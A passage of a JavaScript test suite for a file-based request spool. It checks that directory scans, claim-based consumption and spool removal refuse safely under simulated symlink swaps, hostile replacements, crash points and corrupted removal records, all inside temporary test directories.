          () => inspectRequestEntry(directory, TOKEN),
          () => removeRequestSpoolIfEmpty(directory),
        ]) {
          const error = await caught(probe);
          assert.ok(isRequestSpoolError(error), "refusals stay in the bounded error set");
          assert.equal(error.code, "REQUEST-IDENTITY-UNAVAILABLE");
        }
      },
    );
    assert.equal(chmods, 0, "no repair chmod ran");
    assert.equal(mkdirs, 0, "no directory was created");
    assert.equal(unlinks, 0, "nothing was unlinked");
    assert.equal(rmdirs, 0, "the spool directory was never removed");
    assert.equal(creates, 0, "no marker was created");
    assert.deepEqual(await entryNames(directory), spoolBefore, "the spool is byte-identical");
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "material");
  });
});

/* ================================================================== *
 * Phase 14 / B7 - the legacy directory scan is never authorized by a
 * single observation
 * ================================================================== */

/** A 32-hex name shaped exactly like a request token for leak assertions. */
const FOREIGN_TOKEN = "deadbeefdeadbeefdeadbeefdeadbeef";

async function foreignLegacyDirectory(root, name = "foreign-legacy") {
  const directory = path.join(root, name);
  await mkdir(directory, { mode: 0o700 });
  if (posix) await chmod(directory, 0o700);
  await writeFile(path.join(directory, `${FOREIGN_TOKEN}.txt`), "foreign-request", { mode: 0o600 });
  return directory;
}

function assertUnsafeAndLeakFree(inspection, label) {
  assert.deepEqual(inspection, { status: "unsafe", entries: null }, `${label}: unsafe with no entries`);
  const serialized = JSON.stringify(inspection);
  assert.equal(serialized.includes(FOREIGN_TOKEN), false, `${label}: no foreign name is reported`);
  assert.equal(serialized.includes("foreign-request"), false, `${label}: no foreign content is reported`);
}

test("B7: a legacy directory swapped for a symlink before the scan is unsafe and leaks no names", async () => {
  await withTemp(async (root) => {
    const legacy = await freshLegacy(root);
    await writePublic(legacy, TOKEN, "pending-request");
    const victim = await foreignLegacyDirectory(root, "victim");

    const realLstat = requestSpoolInternals.lstat;
    let proofs = 0;
    const inspection = await withInternals(
      {
        lstat: async (target) => {
          if (path.resolve(target) === path.resolve(legacy)) {
            proofs += 1;
            if (proofs === 2) {
              // The swap lands between the initial proof and the pre-scan re-lstat.
              await rm(legacy, { recursive: true, force: true });
              await symlink(victim, legacy);
            }
          }
          return realLstat(target);
        },
      },
      () => inspectLegacyRequestDirectory(legacy),
    );

    assert.equal(proofs, 2, "the directory was re-lstat'ed immediately before the bounded scan");
    assertUnsafeAndLeakFree(inspection, "swap-to-symlink");
    assert.equal(await readFile(path.join(victim, `${FOREIGN_TOKEN}.txt`), "utf8"), "foreign-request", "the victim is untouched");
  });
});

test("B7: a legacy directory swapped for a different directory before the scan is unsafe and leaks no names", async () => {
  await withTemp(async (root) => {
    const legacy = await freshLegacy(root);
    await writePublic(legacy, TOKEN, "pending-request");
    const foreign = await foreignLegacyDirectory(root);

    const realLstat = requestSpoolInternals.lstat;
    let proofs = 0;
    const inspection = await withInternals(
      {
        lstat: async (target) => {
          if (path.resolve(target) === path.resolve(legacy)) {
            proofs += 1;
            if (proofs === 2) {
              // The swap lands between the initial proof and the pre-scan
              // re-lstat: same shape (owned, 0700, strong identity) but a
              // different directory with different entries.
              await rm(legacy, { recursive: true, force: true });
              await rename(foreign, legacy);
            }
          }
          return realLstat(target);
        },
      },
      () => inspectLegacyRequestDirectory(legacy),
    );

    assert.equal(proofs, 2, "the directory was re-lstat'ed immediately before the bounded scan");
    assertUnsafeAndLeakFree(inspection, "swap-to-directory");
    assert.equal(await readFile(path.join(legacy, `${FOREIGN_TOKEN}.txt`), "utf8"), "foreign-request", "the replacement is untouched");
  });
});

test("B7: the legacy scan re-verifies the directory identity after opening it (seam post-open recheck)", async () => {
  await withTemp(async (root) => {
    const legacy = await freshLegacy(root);
    await writePublic(legacy, TOKEN, "pending-request");
    const foreign = await foreignLegacyDirectory(root);

    const realReaddirNames = requestSpoolInternals.readdirNames;
    let scans = 0;
    const inspection = await withInternals(
      {
        readdirNames: async (target, options) => {
          scans += 1;
          // The swap lands after every caller-side check, at the seam itself:
          // the default implementation's post-open recheck must refuse before
          // a single name is read.
          await rm(legacy, { recursive: true, force: true });
          await rename(foreign, legacy);
          return realReaddirNames(target, options);
        },
      },
      () => inspectLegacyRequestDirectory(legacy),
    );

    assert.equal(scans, 1, "exactly one bounded scan was attempted");
    assertUnsafeAndLeakFree(inspection, "post-open swap");
  });
});

/* ================================================================== *
 * Phase 14 / B1 + B5 - claim-based consumption and spool refusal
 * ================================================================== */

test("B1: consumption preserves a removal claim replaced after its final verification", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "consume me");
    const realRename = requestSpoolInternals.rename;
    const realUnlink = requestSpoolInternals.unlink;
    let renames = 0;
    let unlinks = 0;
    let swappedPath = null;
    await withInternals(
      {
        rename: async (from, to) => {
          renames += 1;
          await realRename(from, to);
          if (renames === 3) {
            // The removal claim is replaced right after the rename that
            // created it: the final verification must refuse and the
            // replacement must survive.
            swappedPath = to;
            await rm(to, { force: true });
            await writeFile(to, "swapped-claim", { mode: 0o600 });
          }
        },
        unlink: async (target) => {
          unlinks += 1;
          return realUnlink(target);
        },
      },
      async () => {
        const error = await caught(() =>
          consumeRequest({ directory, token: TOKEN, route: async () => ({ outcome: "none" }) }),
        );
        assert.ok(isRequestSpoolError(error));
        assert.equal(error.code, "REQUEST-CHANGED");
      },
    );
    assert.equal(renames, 3, "public->claim, claim->commit, commit->removal claim");
    assert.equal(unlinks, 0, "nothing was unlinked");
    assert.equal(await readFile(swappedPath, "utf8"), "swapped-claim", "the replacement survives");
    const names = await entryNames(directory);
    assert.equal(names.includes(REQUEST_MARKER_NAME), true, "the marker is untouched");
    assert.equal(names.filter((name) => name.startsWith(".claim.")).length, 1, "exactly the surviving claim remains");
  });
});

test("B5: an unprovable spool directory refuses emptiness and is never reported ready", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const realLstat = requestSpoolInternals.lstat;
    let scans = 0;
    await withInternals(
      {
        lstat: async (target) => {
          const stat = await realLstat(target);
          if (path.resolve(target) !== path.resolve(directory)) return stat;
          return Object.assign(Object.create(Object.getPrototypeOf(stat)), stat, { ino: 0 });
        },
        readdirNames: async () => {
          scans += 1;
          return { names: [REQUEST_MARKER_NAME], overflow: false };
        },
      },
      async () => {
        const inspected = await inspectRequestSpool(directory);
        assert.equal(inspected.status, "identity-unavailable", "never ready, never adoptable");
        assert.equal(inspected.entries, null, "no entry count is reported for an unprovable spool");
        assert.equal(scans, 0, "no entry scan happened");
        assert.equal(requestSpoolRefusal(inspected)?.code, "REQUEST-IDENTITY-UNAVAILABLE", "mutations refuse it");

        const empty = await caught(() => assertRequestSpoolEmpty(directory));
        assert.ok(isRequestSpoolError(empty));
        assert.equal(empty.code, "REQUEST-IDENTITY-UNAVAILABLE");
        assert.equal(scans, 0, "emptiness was refused before any entry was read");
      },
    );
  });
});

/* ================================================================== *
 * Phase 14 / B2 - spool removal claims the exact marker and directory
 * ================================================================== */

test("B2: remove-empty preserves a replacement marker planted inside the claimed directory", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const markerInClaim = path.join(directory, REQUEST_MARKER_NAME);
    const realRename = requestSpoolInternals.rename;
    let claimPath = null;
    const error = await withInternals(
      {
        rename: async (from, to) => {
          await realRename(from, to);
          if (
            path.basename(from) === REQUEST_MARKER_NAME
            && /^\.spool\.claim-[0-9a-f]{32}$/.test(path.basename(path.dirname(from)))
          ) {
            // A hostile replacement marker reappears inside the claimed
            // directory right after the real marker was moved out to its
            // correlated marker claim.
            claimPath = path.dirname(from);
            await writeFile(path.join(claimPath, REQUEST_MARKER_NAME), "replacement-marker\n", { mode: 0o600 });
          }
        },
      },
      () => caught(() => removeRequestSpoolIfEmpty(directory)),
    );
    assert.ok(isRequestSpoolError(error));
    assert.equal(error.code, "REQUEST-IO-FAILED", "the refilled claim fails closed");
    // The refilled directory claim - holding the replacement marker - is
    // preserved; nothing at it was forced or raw-removed.
    const rootEntries = await entryNames(root);
    assert.equal(rootEntries.includes("spool"), false, "the spool path was claimed");
    const claimName = rootEntries.find((name) => /^\.spool\.claim-[0-9a-f]{32}$/.test(name));
    assert.ok(claimName, "the proven directory claim is preserved");
    assert.equal(
      await readFile(path.join(root, claimName, REQUEST_MARKER_NAME), "utf8"),
      "replacement-marker\n",
      "the replacement marker survives byte-identical inside the preserved claim",
    );
    assert.equal(claimPath === null || typeof claimPath === "string", true);
  });
});

test("B2: a whole-spool replacement that reappears at the original path survives untouched", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const spoolPath = directory;
    const realRename = requestSpoolInternals.rename;
    const result = await withInternals(
      {
        rename: async (from, to) => {
          await realRename(from, to);
          if (path.resolve(from) === path.resolve(spoolPath)) {
            // A hostile whole-spool replacement reappears at the original
            // path right after the spool was claimed; the removal only ever
            // continues against the claim.
            await mkdir(spoolPath, { mode: 0o700 });
            if (posix) await chmod(spoolPath, 0o700);
            await writeFile(path.join(spoolPath, REQUEST_MARKER_NAME), "replacement\n", { mode: 0o600 });
            await writeFile(path.join(spoolPath, "intruder.txt"), "survives", { mode: 0o600 });
          }
        },
      },
      () => removeRequestSpoolIfEmpty(directory),
    );
    assert.deepEqual(result, { removed: true }, "the claimed spool is still removed exactly");
    assert.deepEqual(
      (await entryNames(directory)).sort(),
      [REQUEST_MARKER_NAME, "intruder.txt"].sort(),
      "the whole-spool replacement survives untouched",
    );
    const rootEntries = await entryNames(root);
    assert.equal(rootEntries.some((name) => /^\.spool\.(claim|marker)/.test(name)), false, "every proven claim was consumed");
  });
});

test("B2: remove-empty preserves a replacement directory that reappears at the original path", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const realRename = requestSpoolInternals.rename;
    let claimName = null;
    const result = await withInternals(
      {
        rename: async (from, to) => {
          await realRename(from, to);
          if (path.resolve(from) === path.resolve(directory)) {
            // A hostile replacement directory reappears at the original path
            // right after the spool was claimed.
            claimName = path.basename(to);
            await mkdir(directory, { mode: 0o700 });
            if (posix) await chmod(directory, 0o700);
            await writeFile(path.join(directory, "intruder.txt"), "survives", { mode: 0o600 });
          }
        },
      },
      () => removeRequestSpoolIfEmpty(directory),
    );
    assert.deepEqual(result, { removed: true }, "only the proven claim was removed");
    assert.ok(claimName, "the removal reached the directory claim");
    // The replacement directory at the original path is never touched again.
    assert.deepEqual(await entryNames(directory), ["intruder.txt"], "the replacement survives");
    assert.equal(await readFile(path.join(directory, "intruder.txt"), "utf8"), "survives");
    const rootEntries = await entryNames(root);
    assert.equal(rootEntries.includes(claimName), false, "the proven claim was removed non-recursively");
  });
});

test("B2: an interrupted spool removal is completed on re-entry at every crash point", async () => {
  await withTemp(async (root) => {
    const spool = path.join(root, "spool");
    const recordPathOf = (nonce) => path.join(root, `.spool.removal-${nonce}.json`);
    const claimOf = (nonce) => path.join(root, `.spool.claim-${nonce}`);

    /**
     * Seeds the exact crash state for one stage of the record-bound protocol:
     * a real spool, a durable removal record binding the original spool and
     * marker identities to a nonce, and the claim artifacts that exist at
     * that crash point.
     */
    const seedCrash = async (nonce, stage) => {
      await setupRequestSpool(spool);
      const spoolStat = await lstat(spool);
      const markerStat = await lstat(path.join(spool, REQUEST_MARKER_NAME));
      await writeFile(
        recordPathOf(nonce),
        `${JSON.stringify({
          schema: 1,
          owner: "skill-router",
          nonce,
          spool: { dev: Number(spoolStat.dev), ino: Number(spoolStat.ino) },
          marker: { dev: Number(markerStat.dev), ino: Number(markerStat.ino) },
        })}\n`,
        { mode: 0o600 },
      );
      if (stage === "record") return;
      await rename(spool, claimOf(nonce));
      if (stage === "dir") return;
      const markerClaim = `${claimOf(nonce)}.marker-${"cd".repeat(16)}`;
      await rename(path.join(claimOf(nonce), REQUEST_MARKER_NAME), markerClaim);
      if (stage === "marker") return;
      await rm(markerClaim, { force: true });
      if (stage === "marker-consumed") return;
      await rmdir(claimOf(nonce));
    };

    // Crash after the record write: the fresh sequence resumes with the
    // record's own nonce.
    await seedCrash("ab".repeat(16), "record");
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual((await entryNames(root)).sort(), [], "record, spool, and claims are all gone");

    // Crash after the directory-claim rename.
    await seedCrash("ef".repeat(16), "dir");
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual((await entryNames(root)).sort(), []);

    // Crash after the marker move to its correlated marker claim.
    await seedCrash("12".repeat(16), "marker");
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual((await entryNames(root)).sort(), []);

    // Crash after the marker claim was consumed.
    await seedCrash("34".repeat(16), "marker-consumed");
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual((await entryNames(root)).sort(), []);

    // Crash after the directory claim removal: only the record remains and it
    // is consumed without touching anything else.
    await seedCrash("56".repeat(16), "removed");
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual((await entryNames(root)).sort(), []);

    // A fresh spool still removes normally after every crash point.
    await setupRequestSpool(spool);
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual(await entryNames(root), []);
  });
});

test("B2: foreign claim-shaped lookalikes are distinguished, ignored, and preserved", async () => {
  await withTemp(async (root) => {
    // Right grammar, wrong shape: a directory claim holding foreign content.
    const foreignDir = path.join(root, ".spool.claim-" + "aa".repeat(16));
    await mkdir(foreignDir, { recursive: true });
    await writeFile(path.join(foreignDir, "intruder.txt"), "survives", { mode: 0o600 });
    // Right grammar prefix, wrong shape: a marker claim that is a directory.
    const foreignMarker = path.join(root, `.spool.claim-${"bb".repeat(16)}.marker-${"cc".repeat(16)}`);
    await mkdir(foreignMarker, { recursive: true });
    // Wrong nonce length.
    const wrongLength = path.join(root, ".spool.claim-" + "dd".repeat(8));
    await mkdir(wrongLength, { recursive: true });
    // A claim belonging to a different spool basename.
    const otherSpool = path.join(root, ".other.claim-" + "ee".repeat(16));
    await mkdir(otherSpool, { recursive: true });
    // A marker-shaped file with a group-readable mode is never consumed.
    const weakMarker = path.join(root, `.spool.claim-${"f0".repeat(16)}.marker-${"f1".repeat(16)}`);
    await writeFile(weakMarker, "marker", { mode: 0o644 });

    assert.deepEqual(await removeRequestSpoolIfEmpty(path.join(root, "spool")), { removed: false });
    assert.equal(await readFile(path.join(foreignDir, "intruder.txt"), "utf8"), "survives", "foreign content preserved");
    assert.equal((await lstat(foreignDir)).isDirectory(), true, "foreign directory claim preserved");
    assert.equal((await lstat(foreignMarker)).isDirectory(), true, "foreign marker-claim shape preserved");
    assert.equal((await lstat(wrongLength)).isDirectory(), true, "wrong-length nonce lookalike preserved");
    assert.equal((await lstat(otherSpool)).isDirectory(), true, "another spool's claim preserved");
    assert.equal((await lstat(weakMarker)).isFile(), true, "weak-mode marker lookalike preserved");
  });
});

/* ================================================================== *
 * Phase 14 / R2 - removal-record invariants and bounded scans
 * ================================================================== */

test("B2: removal records with broken invariants are foreign and never authorized", async () => {
  await withTemp(async (root) => {
    const spool = path.join(root, "spool");
    const recordPathOf = (nonce) => path.join(root, `.spool.removal-${nonce}.json`);
    const claimOf = (nonce) => path.join(root, `.spool.claim-${nonce}`);

    /**
     * Seeds a record + its nonce-bound directory claim (marker inside), then
     * corrupts the record. The removal must refuse: the claim and the
     * corrupted record survive, and the fresh spool is untouched.
     */
    const seedCorrupt = async (nonce, corrupt) => {
      await setupRequestSpool(spool);
      const spoolStat = await lstat(spool);
      const markerStat = await lstat(path.join(spool, REQUEST_MARKER_NAME));
      await writeFile(
        recordPathOf(nonce),
        `${JSON.stringify({
          schema: 1,
          owner: "skill-router",
          nonce,
          spool: { dev: Number(spoolStat.dev), ino: Number(spoolStat.ino) },
          marker: { dev: Number(markerStat.dev), ino: Number(markerStat.ino) },
        })}\n`,
        { mode: 0o600 },
      );
      await rename(spool, claimOf(nonce));
      await corrupt(recordPathOf(nonce));
      const result = await removeRequestSpoolIfEmpty(spool);
      assert.deepEqual(result, { removed: false }, "an untrusted record authorizes nothing");
      assert.equal(await exists(claimOf(nonce)), true, "the claim is preserved");
      assert.equal((await lstat(claimOf(nonce))).isDirectory(), true, "the claim still holds the marker");
      assert.equal(await exists(recordPathOf(nonce)), true, "the corrupted record is preserved");
      // Full cleanup between variants so one variant never completes
      // another's leftover removal.
      await rm(`${recordPathOf(nonce)}.alias`, { force: true });
      await rm(claimOf(nonce), { recursive: true, force: true });
      await rm(recordPathOf(nonce), { force: true });
      await rm(spool, { recursive: true, force: true });
    };

    // A hardlinked record (nlink 2) is never trusted.
    await seedCorrupt("ab".repeat(16), async (recordPath) => {
      await link(recordPath, `${recordPath}.alias`);
    });

    // A 0400 record is never trusted.
    await seedCorrupt("cd".repeat(16), async (recordPath) => {
      if (posix) await chmod(recordPath, 0o400);
    });

    // A broad-mode (0644) record is never trusted.
    await seedCorrupt("ef".repeat(16), async (recordPath) => {
      if (posix) await chmod(recordPath, 0o644);
    });

    // A replaced record (valid schema, foreign identities) authorizes nothing.
    await seedCorrupt("12".repeat(16), async (recordPath) => {
      await writeFile(
        recordPath,
        `${JSON.stringify({
          schema: 1,
          owner: "skill-router",
          nonce: "12".repeat(16),
          spool: { dev: 1, ino: 2 },
          marker: { dev: 3, ino: 4 },
        })}\n`,
        { mode: 0o600 },
      );
    });

    // A fresh spool still removes normally afterwards.
    await setupRequestSpool(spool);
    assert.deepEqual(await removeRequestSpoolIfEmpty(spool), { removed: true });
    assert.deepEqual(await entryNames(root), []);
  });
});

test("B2: a parent scan overflow refuses before any new record or claim is created", async () => {
  await withTemp(async (root) => {
    const spool = path.join(root, "spool");
    await setupRequestSpool(spool);
    // Fill the parent past the bounded scan so the claim scan cannot prove
    // discoverability.
    for (let index = 0; index < REQUEST_MAX_ENTRIES + 1; index += 1) {
      await writeFile(path.join(root, `filler-${String(index).padStart(4, "0")}.txt`), "x", { mode: 0o600 });
    }
    const error = await caught(() => removeRequestSpoolIfEmpty(spool));
    assert.ok(isRequestSpoolError(error));
    assert.equal(error.code, "REQUEST-SPOOL-ENTRIES", "the unbounded scan refuses");
    const names = await entryNames(root);
    assert.equal(names.includes("spool"), true, "the spool is untouched");
    assert.equal((await entryNames(path.join(root, "spool"))).sort().join(), [REQUEST_MARKER_NAME].join(), "its marker is intact");
    assert.equal(
      names.some((name) => /^\.spool\.(removal|claim)-/.test(name)),
      false,
      "no new record or claim was created",
    );
  });
});

async function exists(target) {
  try {
    await lstat(target);
    return true;
  } catch (error) {
    if (error.code === "ENOENT") return false;
    throw error;
  }
}

/* ================================================================== *
 * Phase 14 / R5 - the ownership marker must be exactly 0600 before
 * any record or claim exists
 * ================================================================== */

test("R5: a marker whose mode is not exactly 0600 refuses removal before any record or claim", async () => {
  if (!posix) return;
  for (const mode of [0o400, 0o700]) {
    await withTemp(async (root) => {
      const spool = path.join(root, "spool");
      await setupRequestSpool(spool);
      await chmod(path.join(spool, REQUEST_MARKER_NAME), mode);

      const error = await caught(() => removeRequestSpoolIfEmpty(spool));
      assert.ok(isRequestSpoolError(error));
      assert.equal(error.code, "REQUEST-SPOOL-MARKER", `mode ${mode.toString(8)} refuses`);
      const names = await entryNames(root);
      assert.equal(
        names.some((name) => /^\.spool\.(removal|claim)-/.test(name)),
        false,
        "no record or claim was created",
      );
      assert.deepEqual(await entryNames(spool), [REQUEST_MARKER_NAME], "the spool is untouched");
      assert.equal((await lstat(path.join(spool, REQUEST_MARKER_NAME))).mode & 0o777, mode, "the marker keeps its mode");
    });
  }
});
